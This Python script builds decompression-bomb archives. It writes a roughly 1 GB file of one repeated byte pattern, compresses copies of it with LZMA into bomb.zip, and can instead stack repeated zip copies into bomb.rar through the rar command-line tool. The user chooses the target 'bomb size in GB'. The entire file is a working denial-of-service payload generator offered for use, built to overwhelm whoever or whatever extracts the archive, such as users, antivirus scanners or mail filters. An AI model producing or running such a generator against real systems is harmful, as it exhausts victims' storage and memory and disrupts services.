import shutil
import os
import zipfile
import math
import subprocess

# File creator
def createFile():
    file = open('zipBomb.txt', 'wb')
    pattern = b'iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
    for _ in range((1000**2)*10):
        file.write(pattern)
    file.close()

def create_renamed_copy(original_file_name, new_file_name):
    dir_path = os.path.dirname(os.path.realpath(__file__))
    # Construct the full path to the original file
    original_file_path = os.path.join(dir_path, original_file_name)
    
    # Check if the file exists
    if os.path.isfile(original_file_path):
        # Step 1: Copy the file to the same folder
        temp_file_path = os.path.join(dir_path, "temp_" + original_file_name)
        shutil.copy(original_file_path, temp_file_path)
        
        # Step 2: Rename the copied file
        renamed_file_path = os.path.join(dir_path, new_file_name)
        os.rename(temp_file_path, renamed_file_path)
        
        print(f"File {original_file_name} has been renamed to {new_file_name}.")
    else:
        print(f"The file {original_file_name} does not exist.")
# File compressor (into zip)

def createZipArchive(num_copies):
    with zipfile.ZipFile('bomb.zip', 'w', zipfile.ZIP_LZMA, compresslevel=9) as zipf:
        for i in range(num_copies):
            print(f'{i}GB/{num_copies}GB')
            zipf.write('zipBomb.txt', arcname=f'zipBomb.txt{i+1}.txt')

def createRarArchive(num_copies):
    # Create a ZIP file first
    print('Creating zip file')
    createZipArchive(1)  # Ensure this function is defined
    
    # Variables to hold the old and new file names
    oldFile = 'bomb.zip'
    newFile = ''
    
    for i in range(1, num_copies):
        newFile = f'bomb{i}.zip'
        create_renamed_copy(oldFile, newFile)  # Ensure this function is defined
        
        # Append the ZIP file to the RAR archive
        rar_command = ['rar', 'a', 'bomb.rar', newFile]
        try:
            subprocess.run(rar_command, check=True)
            print(f"Successfully appended {newFile} to bomb.rar")
        except subprocess.CalledProcessError as e:
            print(f"Error appending {newFile} to RAR archive: {e}")
        
        # Delete the ZIP file after appending it to the RAR archive
        os.remove(newFile)
    
    # After processing all copies, delete the original file
    os.remove(oldFile)

def removeTxt():
    dir_path = os.path.dirname(os.path.realpath(__file__))
    os.remove(f'{dir_path}\\zipBomb.txt')

def main():
    try:
        fileSize = int(input('Please input desired bomb size in GB: '))
        rarOrZip = input('RAR or ZIP (RAR will create a zipfile, then add them to RAR archive.): ').lower()
        print('Creating a new file.')   
        createFile()
        if rarOrZip == 'rar':
            createRarArchive(fileSize)
        else:
            createZipArchive(fileSize)
        print('Bomb is complete Removing zipBomb.txt')
        removeTxt()
    except ValueError:
        print('Please input a valid number for the bomb size.')
    except Exception as e:
        print(f'An unexpected error occurred: {e}')

if __name__ == "__main__":
    main()
